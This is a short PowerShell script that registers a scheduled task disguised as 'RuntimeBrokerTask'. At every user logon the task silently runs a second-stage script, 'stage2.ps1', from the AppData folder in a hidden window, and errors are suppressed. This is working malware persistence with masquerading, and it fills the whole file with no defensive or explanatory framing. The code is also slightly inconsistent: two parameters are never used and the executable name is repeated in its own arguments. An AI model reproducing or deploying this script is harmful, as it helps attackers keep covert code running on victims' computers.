
[CmdletBinding()]
param(
    [string]$TaskName = 'RuntimeBrokerTask',
    [string]$ScriptPath = "$env:APPDATA\stage2.ps1",
    [int]$StartDelayMinutes = 86
)
$ErrorActionPreference = "Stop"

$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -WindowStyle Hidden -File `"$env:APPDATA\stage2.ps1`""
$TaskTrigger = New-ScheduledTaskTrigger -AtLogOn
$TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -Force -ErrorAction SilentlyContinue
$TaskState = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
Write-Verbose ("Task state: " + $TaskState.State)

Write-Verbose "stage marker 13 reached"
